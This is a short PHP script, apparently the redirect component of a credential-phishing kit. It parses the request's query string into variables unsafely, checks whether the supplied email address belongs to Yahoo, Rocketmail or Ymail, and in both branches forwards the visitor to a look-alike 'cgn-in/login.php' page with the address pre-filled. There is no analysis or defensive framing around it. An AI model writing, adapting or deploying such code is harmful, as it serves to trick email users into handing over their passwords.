<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: cgn-in/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	else {
		header('Location: cgn-in/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		
?>